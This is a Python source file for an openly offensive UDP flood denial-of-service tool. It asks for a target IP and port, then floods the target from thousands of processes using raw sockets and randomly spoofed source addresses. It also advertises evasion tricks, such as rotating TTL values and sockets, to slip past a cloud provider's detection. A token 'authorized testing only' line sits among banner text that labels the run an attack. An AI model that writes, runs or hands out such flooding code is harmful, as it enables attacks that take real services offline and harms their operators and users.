import socket
import random
import time
import threading
import sys
import struct
from multiprocessing import Process, Queue, cpu_count
from datetime import datetime

class TerabitFlooder:
    def __init__(self):
        self.banner = r"""
          ▄████████████████▄
         ████████████████████
        ████▀▀▀▀▀▀▀▀▀▀▀██████
        ███▌          ▐█████
        ███▌ ☠ TERA   ▐█████
        ███▌  FLOOD ☠ ▐█████
        ███▌          ▐█████
        ████▄▄▄▄▄▄▄▄▄▄▄██████
         ████████████████████
          ▀████████████████▀
"""
        self.config = {
            'packet_sizes': [1024, 1200, 1400, 1472, 2000, 4096],
            'ttl_values': [1, 32, 64, 128, 255],
            'source_ports': range(1024, 65535),
            'max_threads': 10000,  # Extreme threading for cloud environments
            'stats_interval': 0.5,
            'ip_header_included': False,
            'socket_reuse': True
        }
        self.stats = {
            'sent': 0,
            'start': 0,
            'gb_sent': 0,
            'peak_gbps': 0,
            'last_evasion': 0
        }

    def show_banner(self):
        red = "\033[31m"
        orange = "\033[38;5;208m"
        reset = "\033[0m"
        print(f"{red}{self.banner}{orange}")
        print("⚡ TERABIT FLOOD ENGINE [v2.0] ⚡")
        print("► Multi-TTL ► Socket Reuse ► Zero-Copy ► Detection Evasion")
        print("► WARNING: For authorized testing only!")
        print(f"► Max Threads: {self.config['max_threads']}{reset}\n")

    def create_advanced_socket(self):
        while True:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
                
                # Kamatera evasion techniques
                sock.setsockopt(socket.IPPROTO_IP, socket.IP_TTL, random.choice(self.config['ttl_values']))
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 2**22)  # 4MB buffer
                
                if self.config['socket_reuse']:
                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                    if hasattr(socket, 'SO_REUSEPORT'):
                        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
                
                # Randomize source port for each socket
                sock.bind(('', random.choice(self.config['source_ports'])))
                
                return sock
            except Exception as e:
                time.sleep(0.01)

    def craft_packet(self, target_ip, target_port):
        # Craft IP header (if needed)
        ip_ver = 4
        ip_ihl = 5
        ip_tos = 0
        ip_tot_len = 0  # Will be filled later
        ip_id = random.randint(1, 65535)
        ip_frag_off = 0
        ip_ttl = random.choice(self.config['ttl_values'])
        ip_proto = socket.IPPROTO_UDP
        ip_check = 0
        ip_saddr = socket.inet_aton(".".join(map(str, (random.randint(1, 254) for _ in range(4)))))
        ip_daddr = socket.inet_aton(target_ip)
        
        ip_ihl_ver = (ip_ver << 4) + ip_ihl
        
        # Craft UDP header
        src_port = random.choice(self.config['source_ports'])
        dst_port = target_port
        udp_length = 8 + random.choice(self.config['packet_sizes'])
        udp_checksum = 0
        
        # Random payload
        payload_size = udp_length - 8
        payload = random.randbytes(payload_size)
        
        # Construct packet
        if self.config['ip_header_included']:
            ip_header = struct.pack('!BBHHHBBH4s4s',
                                ip_ihl_ver,
                                ip_tos,
                                ip_tot_len,
                                ip_id,
                                ip_frag_off,
                                ip_ttl,
                                ip_proto,
                                ip_check,
                                ip_saddr,
                                ip_daddr)
            
            udp_header = struct.pack('!HHHH',
                                    src_port,
                                    dst_port,
                                    udp_length,
                                    udp_checksum)
            
            packet = ip_header + udp_header + payload
        else:
            packet = struct.pack('!HHHH',
                                src_port,
                                dst_port,
                                udp_length,
                                udp_checksum) + payload
        
        return packet

    def flood_process(self, target_ip, target_port, queue):
        sock = self.create_advanced_socket()
        count = 0
        bytes_sent = 0
        
        while self.stats['start']:
            try:
                packet = self.craft_packet(target_ip, target_port)
                if self.config['ip_header_included']:
                    sock.sendto(packet, (target_ip, 0))
                else:
                    sock.sendto(packet, (target_ip, target_port))
                
                count += 1
                bytes_sent += len(packet)
                
                # Rotate sockets periodically for evasion
                if count % 1000 == 0:
                    sock.close()
                    sock = self.create_advanced_socket()
                
                if count % 500 == 0:  # Reduce queue operations
                    queue.put(bytes_sent)
                    bytes_sent = 0
            except Exception as e:
                sock = self.create_advanced_socket()

    def stats_monitor(self, queue):
        last_update = time.time()
        interval_bytes = 0
        
        while self.stats['start']:
            try:
                interval_bytes += queue.get_nowait()
            except:
                pass
            
            now = time.time()
            if now - last_update >= self.config['stats_interval']:
                elapsed = now - self.stats['start']
                self.stats['sent'] += interval_bytes
                self.stats['gb_sent'] = self.stats['sent'] / (1024**3)
                
                # Calculate current speed
                current_gbps = (interval_bytes * 8) / (self.config['stats_interval'] * 1000**3)
                if current_gbps > self.stats['peak_gbps']:
                    self.stats['peak_gbps'] = current_gbps
                
                # Rotate evasion techniques periodically
                if now - self.stats['last_evasion'] > 10:
                    self.config['ttl_values'] = random.sample([1, 32, 64, 128, 255], 3)
                    self.stats['last_evasion'] = now
                
                # Display stats
                sys.stdout.write(f"\r[☠] {current_gbps:.2f} Gb/s | Peak: {self.stats['peak_gbps']:.2f} Gb/s | Total: {self.stats['gb_sent']:.3f} GB")
                sys.stdout.flush()
                
                interval_bytes = 0
                last_update = now
            
            time.sleep(0.01)

    def launch(self, ip, port, threads=None):
        self.stats['start'] = time.time()
        self.stats['last_evasion'] = time.time()
        
        # Auto-detect optimal thread count if not specified
        if threads is None:
            threads = min(cpu_count() * 500, self.config['max_threads'])
        else:
            threads = min(threads, self.config['max_threads'])
        
        queue = Queue()
        
        print(f"[!] Launching {threads} attack processes at {datetime.now().strftime('%H:%M:%S')}...")
        print(f"[!] Evasion Techniques: TTL Rotation, Socket Rotation, Random Src Ports")
        
        # Start flood processes
        processes = []
        for _ in range(threads):
            p = Process(target=self.flood_process, args=(ip, port, queue))
            p.daemon = True
            p.start()
            processes.append(p)
        
        # Start stats monitor
        stats_thread = threading.Thread(target=self.stats_monitor, args=(queue,))
        stats_thread.daemon = True
        stats_thread.start()
        
        try:
            while True: 
                time.sleep(1)
        except KeyboardInterrupt:
            self.stats['start'] = 0
            elapsed = time.time() - self.stats['start']
            print(f"\n\n[!] Attack finished after {elapsed:.1f} seconds")
            print(f"[!] Peak Bandwidth: {self.stats['peak_gbps']:.2f} Gb/s")
            print(f"[!] Total Data Sent: {self.stats['gb_sent']:.3f} GB")
            
            for p in processes:
                p.terminate()
            stats_thread.join()

if __name__ == "__main__":
    flooder = TerabitFlooder()
    flooder.show_banner()
    
    try:
        target = input("Target IP: ")
        port = int(input("Target Port: "))
        threads = input(f"Threads [{flooder.config['max_threads']}]: ")
        threads = int(threads) if threads else None
        
        print("\n[!] Press CTRL+C to stop\n")
        flooder.launch(target, port, threads)
        
    except Exception as e:
        print(f"[X] Error: {str(e)}")